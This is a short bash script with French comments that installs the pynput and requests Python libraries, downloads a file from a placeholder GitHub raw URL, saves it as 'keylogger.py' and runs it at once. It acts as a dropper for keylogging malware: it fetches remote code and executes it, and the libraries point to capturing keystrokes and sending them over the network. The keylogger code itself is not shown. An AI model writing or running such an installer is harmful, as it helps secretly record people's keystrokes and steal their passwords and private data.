#!/bin/bash
pip install logging #installation de la librairie logging
pip install pynput #installation de la librairie pynput
pip install requests #installation de la librairie requests

# URL du fichier Python sur GitHub
GITHUB_URL="https://raw.githubusercontent.com/user/repository/main/script.py"

# Nom du fichier téléchargé
FILENAME="keylogger.py"

# Téléchargement du fichier Python
echo "Téléchargement du script Python depuis GitHub..."
wget $GITHUB_URL -O $FILENAME

# Vérification si le fichier a été téléchargé
if [ -f "$FILENAME" ]; then
    echo "Le fichier $FILENAME a été téléchargé avec succès."
else
    echo "Erreur lors du téléchargement du fichier $FILENAME."
    exit 1
fi

# Exécution du fichier Python
echo "Exécution du fichier Python..."
python3 keylogger.py